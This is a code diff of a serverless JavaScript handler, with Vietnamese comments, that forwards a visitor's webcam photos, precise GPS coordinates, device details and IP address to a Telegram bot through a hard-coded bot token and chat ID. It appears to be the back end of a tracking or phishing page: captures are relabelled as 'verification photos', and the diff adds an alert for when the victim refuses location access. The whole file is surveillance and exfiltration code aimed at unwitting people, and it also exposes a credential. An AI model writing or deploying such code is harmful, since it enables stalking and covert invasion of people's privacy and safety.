@@ -6,28 +6,30 @@ export default async function handler(req, res) {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
+    // ==========================================
+    // CẤU HÌNH TELEGRAM ĐÃ ĐIỀN SẴN
     const BOT_TOKEN = "8906469523:AAGqHWiK7W7oZFCglf8Vs_xUYoe6zKo7Nkk"; 
-    const CHAT_ID = "8906469523"; 
+    const CHAT_ID = "7750249320"; 
+    // ==========================================
 
     try {
         const data = req.body;
         let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         if (ip.includes(',')) ip = ip.split(',')[0].trim();
 
-        // --- XỬ LÝ GỬI ẢNH LIVESTREAM ---
-        if (data.type === "webcam_stream") {
+        // --- XỬ LÝ GỬI ẢNH WEBCAM ---
+        if (data.type === "webcam") {
             const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
             const buffer = Buffer.from(base64Data, 'base64');
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `🎥 *LIVESTREAM (CAM ${data.camera})* - IP: \`${ip}\``);
+            formData.append('caption', `📸 *ẢNH XÁC MINH (CAM ${data.camera})*\nIP: \`${ip}\``);
             formData.append('parse_mode', 'Markdown');
             
             const blob = new Blob([buffer], { type: 'image/jpeg' });
-            formData.append('photo', blob, 'stream.jpg');
+            formData.append('photo', blob, 'capture.jpg');
 
-            // Gửi ảnh lên Telegram
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -36,12 +38,14 @@ export default async function handler(req, res) {
             return res.status(200).json({ success: true });
         }
 
-        // --- XỬ LÝ TEXT (GPS, INFO...) ---
+        // --- XỬ LÝ GỬI TEXT (INFO, GPS) ---
         let message = "";
         if (data.type === "basic_info") {
             message = `📱 *THIẾT BỊ TRUY CẬP*\n\n*IP:* \`${ip}\`\n*Hệ điều hành:* ${data.platform}\n*Màn hình:* ${data.screen}\n*Trình duyệt:* ${data.userAgent}`;
         } else if (data.type === "gps") {
             message = `📍 *VỊ TRÍ GPS CHÍNH XÁC!*\n\n*IP:* \`${ip}\`\n*Vĩ độ:* ${data.lat}\n*Kinh độ:* ${data.lon}\n\n[🗺 Xem trên Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`;
+        } else if (data.type === "gps_denied") {
+            message = `⚠️ *TỪ CHỐI GPS*\n*IP:* \`${ip}\``;
         }
 
         if (message) {
